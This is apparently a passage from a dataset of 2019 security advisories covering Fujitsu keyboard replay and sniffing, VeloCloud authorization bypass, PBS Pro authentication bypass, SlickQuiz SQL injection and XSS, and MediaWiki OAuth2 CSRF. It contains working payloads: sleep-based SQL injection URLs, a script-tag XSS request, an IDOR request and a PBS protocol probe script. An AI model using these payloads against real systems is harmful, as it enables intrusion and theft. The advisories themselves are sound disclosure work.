| ' // _ | | / __| __| '__/ _ | |/ / _ \___ | '_ | | |_| |_ / _ '__|
| . __/ |_| \__ |_| | | (_) | < __/ ___) | | | | | _| _| __/ |
|_|\_\___|\__, |___/\__|_| \___/|_|\_\___| |____/|_| |_|_|_| |_| \___|_|
|___/
SySS Fujitsu LX390 Keystroke Sniffer - PoC Tool v0.1 by Matthias Deeg - SySS GmbH
Based on different tools by Marc Newlin
- ---
3B:5B:53:BD:43:DB 42:EF:F5:0A:2D 02:45:13:93:AB KEY_P
3B:5B:53:BD:43:DB 42:CF:F5:0C:CB 02:41:13:F3:CC KEY_P
3B:5B:53:BD:43:DB 42:EF:F5:0A:2D 02:45:13:93:AB KEY_P
3B:5B:53:BD:43:DB 42:CF:1D:70:ED 02:41:04:CD:A8 KEY_A
3B:5B:53:BD:43:DB 42:EF:1D:76:0B 02:45:04:AD:CF KEY_A
3B:5B:53:BD:43:DB 42:CF:1D:70:ED 02:41:04:CD:A8 KEY_A
3B:5B:53:BD:43:DB 42:EF:55:BF:C7 02:45:16:3E:FC KEY_S
3B:5B:53:BD:43:DB 42:CF:55:B9:21 02:41:16:5E:9B KEY_S
3B:5B:53:BD:43:DB 42:EF:55:BF:C7 02:45:16:3E:FC KEY_S
3B:5B:53:BD:43:DB 42:EF:65:89:94 02:45:1A:52:36 KEY_W
(...)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The Fujitsu Wireless Keyboard Set LX390 reached its end-of-life (EOL) in
May 2019.
Fujitsu has released two new wireless keyboard sets named LX410 [8] and
LX960 [9] that are not affected by the described security issue.
SySS recommends replacing LX390 wireless keyboard sets used in
environments with higher security demands, for instance with one of the
newer successor models LX410 or LX960.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2019-04-01: Vulnerability reported to manufacturer
2019-04-02: Fujitsu confirms receipt of security advisory and asks
questions regarding the reported security issue;
answered open questions
2019-04-11: Received further questions from manufacturer
2019-04-18: Answered open questions and postponed disclosure date
2019-10-08: Reminded manufacturer of the upcoming release of the
security advisory
2019-10-18: Discussed details of coordinated disclosure with
manufacturer
2019-10-21: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for Fujitsu Wireless Keyboard Set LX390
https://www.fujitsu.com/global/products/computing/peripheral/accessories/input-devices/keyboards/keyboard-lx390.html
[2] Data sheet Fujitsu Wireless Keyboard Set LX390
https://produktinfo.conrad.com/datenblaetter/1300000-1399999/001375431-da-01-en-FUJITSU_DESKTOP_SET_WIREL_LX390_WEISS.pdf
[3] SySS Security Advisory SYSS-2019-011
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-011.txt
[4] GNU Radio
https://www.gnuradio.org/
[5] Universal Radio Hacker (URH)
https://github.com/jopohl/urh
[6] Product website for Crazyradio PA
https://www.bitcraze.io/crazyradio-pa/
[7] Bastille's nRF24 research firmware and tools
https://github.com/BastilleResearch/nrf-research-firmware
[8] Product website for Fujitsu Wireless Keyboard Set LX410
https://www.fujitsu.com/global/products/computing/peripheral/accessories/input-devices/keyboards/keyboard-lx410.html
[9] Product website for Fujitsu Wireless Keyboard Set LX960
https://www.fujitsu.com/global/products/computing/peripheral/accessories/input-devices/keyboards/keyboard-lx960.html
[10] SySS Security Advisory SYSS-2019-010
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-010.txt
[11] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Matthias Deeg of SySS GmbH.
E-Mail: matthias.deeg (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Matthias_Deeg.asc
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE0fCgNfBs5nXNuQUU2aS/ajStTasFAl2wG84ACgkQ2aS/ajSt
TasGfA/6A2+us49Z3ZAYp/ctq+bCORNooowoZFf0eYW5+k0pLOuVusTA+sGwnxgN
VZcCpAzGKkkXiqOI+vVgzyncjzFY33GAiFEat+pFjsxRL9clO0rKKWTymTKA5uIR
1nn4cR98gfgB5ik5u6WZSQeH6hmP/kEmjRMjS0B7LjrFu+oWU3rnIqS4RhcSYRdd
9JSEdj2wD9R3IHwglZE7t8d/p4OBXmq+Ith0fzssJW2J+salsqwuD8YK58fMe1J5
i8WutJry1LCW+eYrC9MQYWSYVlj82manqoyP8GLJtRkt9Wk1Zp+kNr4bn7t8GP0J
N/QTLzUOrOfL9tsbsPxOU6t5rCS40iZdD3d2UFDQPgJHreUA6ocJN3f4ajnzwq7h
Xj/Q+t43zhfi6IqbqBciDBzFskO/AVyo7odP7RRt5g4p8fE40+PogNegaO+n1vBv
K2gTPGk3pgogkxT+Dk8fpPalVltr7eSRz+0/3KLun9JUgQMJc1SB2pjNDlV6nAFC
vg7QJ6aWufrNKia4/NorKXrD48ubBkvA6R+CVDed1ePbbQSDpFzjgVRHoc+5vXsE
BCU/QlEK6LmM2OylFvsmlEaHA/UDmXb2ppCrxTbgAywcKlJ3JogbgKaKrKfLXTn0
lpFMUy3CyDUJmP2mT5uzsGqp+nj97TBWgdPcaccd7xEeWxU9xW4=
=Noe8
-----END PGP SIGNATURE-----"
189,[SYSS-2019-009]: Fujitsu Wireless Keyboard Set LX390 - Missing Protection against Replay Attacks (CVE-2019-18199),,CVE-2019-18199,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2019-009
Product: Wireless Keyboard Set LX390
Manufacturer: Fujitsu
Affected Version(s): Model No. GK381
Tested Version(s): Model No. GK381
Vulnerability Type: Cryptographic Issues (CWE-310)
Missing Protection against Replay Attacks
Risk Level: Medium
Solution Status: Open (product reached end-of-life (EOL) in May 2019)
Manufacturer Notification: 2019-03-22
Solution Date: -
Public Disclosure: 2019-10-23
CVE Reference: CVE-2019-18199
Author of Advisory: Matthias Deeg (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Fujitsu Wireless Keyboard Set LX390 is a wireless desktop set consisting
of a mouse and a keyboard.
The manufacturer describes the product as follows (see [1, 2]):
""The Wireless Keyboard Set LX390 is an excellent desktop solution for
users with ambition. This durable keyboard set is equipped with secure
2.4 GHz technology and plug and play technology. The elegant mouse
works on most surfaces due to its precise 1000 dpi sensor. It offers
fabulous features and ultra slim, portable design.""
Due to an insecure implementation of the data communication, the
wireless keyboard LX390 is vulnerable to replay attacks.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
SySS GmbH found out that the wireless keyboard Fujitsu LX390 is prone to
replay attacks.
An attacker can simply sniff the data packets of the 2.4 GHz radio
communication sent by the keyboard to the receiver (USB dongle) and
replay the recorded communication data at will causing the same effect
as the original data communication.
A replay attack against the keyboard can, for example, be used to gain
unauthorized access to a computer system that is operated with a
vulnerable Fujitsu LX390 keyboard. In this attack scenario, an attacker
records the radio communication during a password-based user
authentication of his or her victim, for instance during a login to the
operating system or during unlocking a screen lock. At an opportune
moment when the victim's computer system is unattended, the attacker
approaches the victim's computer and replays the previously recorded
data communication for the password-based user authentication and
thereby gets unauthorized access to the victim's system.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
SySS GmbH could successfully perform a replay attack as described in the
previous section using a software-defined radio in combination with the
software tool GNU Radio Companion.
It was also possible to perform successful replay attacks using an
in-house developed software tool in combination with the USB radio
dongle Crazyradio PA and the nrf-research-firmware by Bastille Networks
Internet Security written by Marc Newlin (see [3] and [4]).
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The Fujitsu Wireless Keyboard Set LX390 reached its end-of-life (EOL) in
May 2019.
Fujitsu has released two new wireless keyboard sets named LX410 [5] and
LX960 [6] that are not affected by the described security issue.
SySS recommends replacing LX390 wireless keyboard sets used in
environments with higher security demands, for instance with one of the
newer successor models LX410 or LX960.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2019-03-22: Vulnerability reported to manufacturer
2019-03-23: Fujitsu confirms receipt of security advisory
2019-04-02: Received question from manufacturer and answered them
2019-04-11: Received further questions from manufacturer
2019-04-18: Answered open questions and postponed disclosure date
2019-10-08: Reminded manufacturer of the upcoming release of the
security advisory
2019-10-18: Discussed details of coordinated disclosure with manufacturer
2019-10-21: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for Fujitsu Wireless Keyboard Set LX390 (not available anymore)
http://www.fujitsu.com/global/products/computing/peripheral/accessories/input-devices/keyboards/keyboard-lx390.html
[2] Data sheet Fujitsu Wireless Keyboard Set LX390
https://produktinfo.conrad.com/datenblaetter/1300000-1399999/001375431-da-01-en-FUJITSU_DESKTOP_SET_WIREL_LX390_WEISS.pdf
[3] Product website for Crazyradio PA
https://www.bitcraze.io/crazyradio-pa/
[4] Bastille's nRF24 research firmware and tools
https://github.com/BastilleResearch/nrf-research-firmware
[5] Product website for Fujitsu Wireless Keyboard Set LX410
https://www.fujitsu.com/global/products/computing/peripheral/accessories/input-devices/keyboards/keyboard-lx410.html
[6] Product website for Fujitsu Wireless Keyboard Set LX960
https://www.fujitsu.com/global/products/computing/peripheral/accessories/input-devices/keyboards/keyboard-lx960.html
[7] SySS Security Advisory SYSS-2019-009
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-009.txt
[8] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Matthias Deeg of SySS GmbH.
E-Mail: matthias.deeg (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Matthias_Deeg.asc
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE0fCgNfBs5nXNuQUU2aS/ajStTasFAl2wGtYACgkQ2aS/ajSt
TasSMQ//bCaFN+1NLjXqLWcRfYUcdP+9leDesfPRdEWOuItrLzCxhN3BaSeQJoxc
F/U8jct5qnw7Ybc1NMNlzIMjyqThp00gZkmllLLrhQpmbl88KowrFalhfqnpwvQU
oOemWt0H7RhFpYY9qa+P1ZXQIahziIh9aPbSCXnEjnxBzf+i8kY13xmYJx5j8APY
zoU7IAWU0Ec6LHTZeNfy5KZc7n6jfsFH8qQunoKTzdPvA6VeLav0N/3blYJMWla7
OkOyqm37h7X8wCa16/E5caNTWuPdkXnVORGYk7QgzTk8bOnge+3alFWx5xkH2Chl
JjLu/RijcYauSrk6/TLDQcSk9xAAbPTk3xgbJPmmo6o+TqMp6EbELuSJ+g9i0ItJ
qqPVa/bgGWAS3EQdSLR4BVL7p9mpyajtUiOyonqb14gpNHKl0k8klrv424oBsEqb
XhloBSH5jEvByAch/E8rMuncxXVOvADhDyLZTJ+OXpNdtmKFMg3d5WP7cgArs4b+
sia6aCr2OAp5iXL34nSl9ruQr2UzueMy3SnIgt44EfccwlqvNmb8RRuMfQ0cgBPZ
D8AGupbz6ecLmMyINWA3FTh0i9H1WZUIO0XT3vJsOW+Bg1tglrPQYrASQNi6yz7U
+2j/v0u1/zcHLzwWpdjc982E7fcb/BxRbKY6jfwnyhQSvMAg9Eo=
=ZCt8
-----END PGP SIGNATURE-----"
197,CVE-2019-5533 - VMware VeloCloud Authorization Bypass,,CVE-2019-5533,"#############################################################
#
# COMPASS SECURITY ADVISORY
# https://www.compass-security.com/research/advisories/
#
#############################################################
#
# Product: VeloCloud
# Vendor: VMware
# CVE ID: CVE-2019-5533
# CSNC ID: CSNC-2019-007
# Subject: Authorization Bypass
# Risk: Moderate
# Effect: Remotely exploitable
# CVSS v3.1 Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
# Author: Silas Bärtsch <silas.baertsch compass-security com>
# Date: 10.16.2019
#
#############################################################
Introduction:
-------------
VeloCloud [1], now part of VMware, is a SD-WAN market leader.
VMware SD-WAN by VeloCloud is a key component of the Virtual Cloud Network
and tightly integrated with NSX Data Center and NSX Cloud to enable customers
extend consistent networking and security policies from the data center
to the branch to the cloud. Compass Security [2] identified a vulnerability
that allows a VeloCloud standard admin user to access user information
of other VeloCloud customers.
Affected:
---------
Vulnerable:
3.3.0 and 3.2.2.
Not vulnerable:
3.3.1
No other version was tested, but it is believed for the older versions to be
vulnerable as well.
Technical Description
---------------------
The standard admin user uses the following HTTP request to retrieve
user information. The request contains the id parameter twice. The server
does not perform any authorization checks on this parameter. Changing
it will return the user details of the corresponding user, even if the
returned user details belong to other VeloCloud customers.
```
POST /portal/ HTTP/1.1
Host: vco109-usca1.velocloud.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://vco109-usca1.velocloud.net/
Content-Type: application/json
x-vco-privileges-version: 1560945325637
X-Requested-With: XMLHttpRequest
Content-Length: 90
Cookie: culture=en-US; velocloud.session=[CUT-BY-COMPASS]
Connection: close
{""jsonrpc"":""2.0"",""method"":""enterpriseUser/getEnterpriseUser"",""params"":{""id"":1},""id"":1}
```
The following information is returned.
```
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 19 Jun 2019 13:02:11 GMT
Content-Type: application/json
Content-Length: 569
Connection: close
X-Powered-By: Express
Set-Cookie: velocloud.message=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT
x-vco-privileges-version: 1560945325637
Cache-Control: no-cache,no-store,must-revalidate
Pragma: no-cache
Expires: 0
Strict-Transport-Security: max-age=31536000; includeSubdomains;
X-Frame-Options: SAMEORIGIN
{""jsonrpc"":""2.0"",""result"":
{
""id"":[CUT-BY-COMPASS],
""created"":""[CUT-BY-COMPASS]"",
""userType"":""[CUT-BY-COMPASS]"",
""username"":""[CUT-BY-COMPASS]"",
""domain"":[CUT-BY-COMPASS],
""password"":""*****"",
""firstName"":[CUT-BY-COMPASS],
""lastName"":[CUT-BY-COMPASS],
""officePhone"":[CUT-BY-COMPASS],
""mobilePhone"":[CUT-BY-COMPASS],
""email"":""[CUT-BY-COMPASS]"",
""isNative"":[CUT-BY-COMPASS],
""isActive"":[CUT-BY-COMPASS],
""isLocked"":[CUT-BY-COMPASS],
""disableSecondFactor"":[CUT-BY-COMPASS],
""lastLogin"":""[CUT-BY-COMPASS]"",
""modified"":""[CUT-BY-COMPASS]"",
""passwordModified"":""[CUT-BY-COMPASS]"",
""enterpriseId"":[CUT-BY-COMPASS],
""enterpriseProxyId"":[CUT-BY-COMPASS],
""roleId"":[CUT-BY-COMPASS],
""roleName"":""[CUT-BY-COMPASS]"",
""networkId"":[CUT-BY-COMPASS],
""isSuper"":[CUT-BY-COMPASS]},
""id"":[CUT-BY-COMPASS]
}
```
Workaround / Fix:
-----------------
Upgrade to VeloCloud 3.3.1, where the authorization checks are performed correctly.
Timeline:
---------
2019-10-16: Coordinated public disclosure date
2019-08-26: Assigned CVE-2019-5533
2019-08-21: Release of VeloCloud 3.3.1 which includes a fix for the vulnerability
2019-07-02: Initial vendor response
2019-07-01: Initial vendor notification
2019-06-27: Assigned CSNC-2019-007
2019-06-19: Discovery by Silas Bärtsch
References:
-----------
[1] https://www.velocloud.com
[2] https://compass-security.com"
198,CVE-2019-3010 - Local privilege escalation on Solaris 11.x via xscreensaver,,CVE-2019-3010,"Dear Bugtraq,
Please find attached an advisory for the following vulnerability, fixed in Oracle's Critical Patch Update (CPU) of October 2019:
""Exploitation of a design error vulnerability in xscreensaver, as distributed with Solaris 11.x, allows local attackers to create (or append to) arbitrary files on the system, by abusing the -log command line switch introduced in version 5.06. This flaw can be leveraged to cause a denial of service condition or to escalate privileges to root.""
For further information, refer to the following links:
https://techblog.mediaservice.net/2019/10/local-privilege-escalation-on-solaris-11-x-via-xscreensaver/
https://github.com/0xdea/exploits/blob/master/solaris/raptor_xscreensaver
Regards,
--
Marco Ivaldi, SAT Manager
CISSP, OSCP, QSA, ASV, OPSA, OPST, OWSE, LA27001, PRINCE2F
@Mediaservice.net S.r.l. con Socio Unico
https://www.mediaservice.net/"
209,PBS Professional MoM Authentication Bypass (CVE-2019-15719),,CVE-2019-15719,"===========================================================
PBS Professional MoM Authentication Bypass (CVE-2019-15719)
===========================================================
* Software: PBS Professional
* Affected Versions: All versions up to and including 19.2.3
* Vendor: Altair Engineering, Inc
* CVE Reference: CVE-2019-15719
* Severity: CVSS 9.0 [CVSS:3.0/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H]
* Author: John Fitzpatrick
* Date: 2019-10-08
Description
===========
HPCsec have identified a vulnerability in PBS Pro which allows for arbitrary code execution on any node running the pbs_mom service. This vulnerability can be exploited by anyone in a position to communicate with the pbs_mom service from an authorized node within the cluster. Exploitation of this issue allows for arbitrary code execution as any other user including as root, even in installations where root is not permitted to submit jobs.
This issue arises as a result of the pbs_mom service failing to apply a necessary security check before handling instructions sent to it.
By default the pbs_mom service runs on TCP port 15002. The following code can be run to check whether a mom is vulnerable to this issue:
---BEGIN CODE::python---
import socket
import sys
if len(sys.argv) < 2:
print ""ERROR: Please specify the address of pbs_mom""
sys.exit(1)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
s.connect((sys.argv[1], 15002))
s.send(""+2+1+1+1x+1x+1x2+222+15+1x+0+1x+02+24+1x+01+1x+02+12+1x+0+1x+02+14+1x+0+1x+02+""+
""131+1x+0+1x+02+411+1x+01+1x+02+241+1x+01+1x+02+261+1x+01+1x+02+12+1x+0+1x+02+1""+
""31+1x+0+1x+02+421+1x+01+1x+02+221+1x+1+1x+112+102+251+1x+1+1x+1x2+102+221+1x+0""+
""+1x2+103+3351+1x+01+1x+02+13+1x+0+1x+02+14+1x+0+1x2+102+19+1x+0+1x+02+12+1x+0+""+
""11+02+181+1x+0+210+02+29+6hpcsec+01+1x+02+141+1x+0+11+0+0"")
response = s.recv(64)
if ""Invalid"" in response:
print ""Vulnerable = NO""
elif ""Access"" in response:
print ""Vulnerable = UNKNOWN (try again from a permitted host, e.g. another mom or the pbs server)""
elif ""Undefined"" or ""System"" in response:
print ""Vulnerable = YES""
else:
print ""Vulnerable = UNKNOWN (unhandled response)""
except Exception, e:
print ""ERROR: ""+str(e)
# Download here: https://files.hpcsec.com/utilities/check-CVE-2019-15719.py
---END CODE---
Solution
========
A fix for this issue has been incorporated into all currently supported versions of PBS Professional. Fixes are available in the following versions:
* 13.0.412
* 14.2.7
* 18.2.5
* 19.2.4 and newer
A fix is now available on GitHub for users of the open source 19.1.X branch. The fix is incorporated into the current 19.1.2 release with no change to the version number. Therefore earlier instances of 19.1.2 are vulnerable.
Those running earlier versions should update to the latest fixed version in the relevant branch.
The updated versions are available from the Altair PBS Professional download site (https://www.pbspro.org/Download.aspx#download).
Timeline
========
2019-08-22: Issue reported to Altair
2019-10-07: Patch available for all supported versions of PBS Pro
2019-10-08: HPCsec advisory published
================================================
https://www.hpcsec.com/2019/10/08/cve-2019-15719
================================================"
256,"[CVE-2019-12516] SlickQuiz for Wordpress 1.3.7.1 ""/wp-admin/admin.php?page=slickquiz-*"" Multiple Authenticated SQL Injections",,CVE-2019-12516,"RCE Security Advisory
https://www.rcesecurity.com
1. ADVISORY INFORMATION
=======================
Product: SlickQuiz
Vendor URL: https://wordpress.org/plugins/slickquiz/
Type: SQL Injection [CWE-74]
Date found: 2019-05-30
Date published: 2019-09-10
CVSSv3 Score: 8.1 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)
CVE: CVE-2019-12516
2. CREDITS
==========
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.
3. VERSIONS AFFECTED
====================
SlickQuiz for Wordpress 1.3.7.1 (latest)
4. INTRODUCTION
===============
SlickQuiz is a plugin for displaying and managing pretty, dynamic quizzes. It
uses the SlickQuiz jQuery plugin.
(from the vendor's homepage)
5. VULNERABILITY DETAILS
========================
The SlickQuiz Wordpress plugin is vulnerable to multiple authenticated SQL
Injections whenever the ""id"" parameter is involved. It is not even required to
have any quiz created, just the pure presence of the plugin makes the
installation vulnerable.
Since all access levels from Subscriber (the lowest possible rights) to Admin
basically have access to the plugin, it is possible to escalate privileges quite easily.
To name just a few vulnerable endpoints:
/wp-admin/admin.php?page=slickquiz-scores&id=(select*from(select(sleep(5)))a)
/wp-admin/admin.php?page=slickquiz-edit&id=(select*from(select(sleep(5)))a)
/wp-admin/admin.php?page=slickquiz-preview&id=(select*from(select(sleep(5)))a)
6. RISK
=======
The vulnerability can be used by an authenticated attacker (lowest possible
rights of Subscriber are sufficient) to read sensitive contents from the backend
database and therefore compromise all kinds of information, which is stored in
the database. This could be sensitive authentication information like passwords
or customer and employee information like email addresses and could also be used
to escalate privileges to Admin which in return leads to RCE on the Wordpress
installation via the plugin functionality.
7. SOLUTION
===========
None (Remove the plugin)
8. REPORT TIMELINE
==================
2019-05-30: Discovery of the vulnerability during H1-4420
2019-06-01: CVE requested from MITRE
2019-06-02: MITRE assigns CVE-2019-12516
2019-06-10: Contacted vendor using their publicly listed email address
2019-06-19: Contacted vendor using their publicly listed email address
2019-06-22: Contacted vendor using their publicly listed email address
2019-08-28: No response from vendor
2019-09-10: Public disclosure.
9. REFERENCES
=============
https://www.rcesecurity.com/2019/09/H1-4420-From-Quiz-to-Admin-Chaining-Two-0-Days-to-Compromise-an-Uber-Wordpress/"
257,"[CVE-2019-12517] SlickQuiz for Wordpress 1.3.7.1 ""/wp-admin/admin.php?page=slickquiz"" Multiple Stored XSS",,CVE-2019-12517,"RCE Security Advisory
https://www.rcesecurity.com
1. ADVISORY INFORMATION
=======================
Product: SlickQuiz
Vendor URL: https://wordpress.org/plugins/slickquiz/
Type: Cross-Site Scripting [CWE-79]
Date found: 2019-05-30
Date published: 2019-09-10
CVSSv3 Score: 6.1 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
CVE: CVE-2019-12517
2. CREDITS
==========
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.
3. VERSIONS AFFECTED
====================
SlickQuiz for Wordpress 1.3.7.1 (latest)
4. INTRODUCTION
===============
SlickQuiz is a plugin for displaying and managing pretty, dynamic quizzes. It
uses the SlickQuiz jQuery plugin.
(from the vendor's homepage)
5. VULNERABILITY DETAILS
========================
The ""save_quiz_score"" functionality available to unauthenticated users via the
Wordpress ""/wp-admin/admin-ajax.php"" endpoint allows unauthenticated users to
submit quiz solutions/answers. If the configuration option ""Save user scores""
is enabled (disabled by default), the response is stored in the database and
later shown in the Wordpress backend for all users with at least Subscriber
rights.
However, since the plugin does not properly validate and sanitize the quiz
response, a malicious XSS payload in either the name, the email or the score
parameter like:
POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0)
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 181
DNT: 1
Connection: close
action=save_quiz_score&json={""name"":""Na<script>alert(document.domain)</script>
me"",""email"":""info@local<script>alert(document.domain)</script>host"",
""score"":""<script>alert(document.domain)</script>"",""quiz_id"":1}
is executed directly within the backend at ""/wp-admin/admin.php?page=slickquiz""
across all users with the privileges of at least subscriber and up to admin.
6. RISK
=======
To successfully exploit this vulnerability an authenticated user must be tricked
into visiting the SlickQuiz administrative backend on the affected Wordpress
installation.
The vulnerability can be used to permanently embed arbitrary script code into the
administrative Wordpress backend, which offers a wide range of possible
attacks such as redirecting the user to a malicious page, spoofing content on the
page or attacking the browser and its plugins.
7. SOLUTION
===========
None (Remove the plugin)
8. REPORT TIMELINE
==================
2019-05-30: Discovery of the vulnerability during H1-4420
2019-06-01: CVE requested from MITRE
2019-06-02: MITRE assigns CVE-2019-12517
2019-06-10: Contacted vendor using their publicly listed email address
2019-06-19: Contacted vendor using their publicly listed email address
2019-06-22: Contacted vendor using their publicly listed email address
2019-08-28: No response from vendor.
2019-09-10: Public disclosure.
9. REFERENCES
=============
https://www.rcesecurity.com/2019/09/H1-4420-From-Quiz-to-Admin-Chaining-Two-0-Days-to-Compromise-an-Uber-Wordpress/"
299,[CVE-2019-15150] CSRF in MediaWiki extension OAuth2 Client 0.3,,CVE-2019-15150,"[CVE-2019-15150] CSRF in MediaWiki extension OAuth2 Client 0.3
Happy Sunday everyone.
A security bulletin for you all.
Software:
--------
MediaWiki OAuth2 Client (https://github.com/Schine/MW-OAuth2Client)
Description:
----------
MediaWiki implementation of the PHP League's OAuth2 Client, to allow MediaWiki
to act as a client to any OAuth2 server.
Not Affeted:
------------
0.2 and earlier.
Affected Versions:
---------------
0.3
Fixed Versions:
-------------
0.4
Problem:
--------
In the OAuth2 Client extension 0.3 for MediaWiki, a CSRF vulnerability
exists due to the OAuth2 state parameter not being checked in the callback
function.
Per OAuth 2.0 spec, the authorization code grant flow is susceptible to CSRF
and clickjacking attacks unless an appropriate ""state"" parameter is chosen and
verified.[1][2][3]
Although the software correctly generates an unguessable state value and sets
it in the URL to the OAuth 2.0 server, it fails to actually check/validate the
parameter in the callback against what it previously selected.
The regression was introduced when switching underlying vendor code.[4]
Impact:
-------
As described in the OAuth 2.0 RFC spec, this opens the site relying on the
software up to clickjacking and CSRF attacks.[1]
A successful attack can lead to loss of integrity of the user/victim.
Solution:
---------
Update callback function to verify presence and correct `state` value as
previously chosen prior to initiating the OAuth2 flow[5], as done in v0.4
release.[6]
Timeline:
---------
2019-08-17: Bug discovered
2019-08-17: CVE requested, assigned, privately disclosed to maintainer,
bugfix/patch authored
2019-08-18: Maintainer acknowledged, patched version 0.4 is released
Credit:
-------
Discovery by me.
Thanks to the maintainer Schine GmbH. for a quick acknowledgement and release.
References:
-----------
[1]: https://tools.ietf.org/html/rfc6749#section-10.12
[2]: https://auth0.com/docs/protocols/oauth2/mitigate-csrf-attacks
[3]: https://auth0.com/docs/protocols/oauth2/oauth-state
[4]: https://github.com/Schine/MW-OAuth2Client/commit/7188d6c8d359d41c6974c19b2c0907653bab8f6e
[5]: https://github.com/Schine/MW-OAuth2Client/commit/6a4fe4500ddd72ad4e826d9d63b2d69512bd10d1
[6]: https://github.com/Schine/MW-OAuth2Client/releases/tag/v0.4
--
Best Regards,
Justin Bull
PGP Fingerprint: E09D 38DE 8FB7 5745 2044 A0F4 1A2B DEAA 68FD B34C"
331,[SYSS-2019-004]: ABUS Secvest (FUAA50000) - Message Transmission - Unchecked Error Condition (CWE-391),CWE-391,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2019-004
Product: ABUS Secvest (FUAA50000)
Manufacturer: ABUS
Affected Version(s): v3.01.01
Tested Version(s): v3.01.01
Vulnerability Type: Message Transmission - Unchecked Error Condition (CWE-391)
Risk Level: High
Solution Status: Open
Manufacturer Notification: 2019-03-02
Solution Date: -
Public Disclosure: 2019-07-26
CVE Reference: CVE-2019-14261
Authors of Advisory: Matthias Deeg (SySS GmbH), Thomas Detert
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
ABUS Secvest (FUAA50000) is a wireless alarm system with different
features.
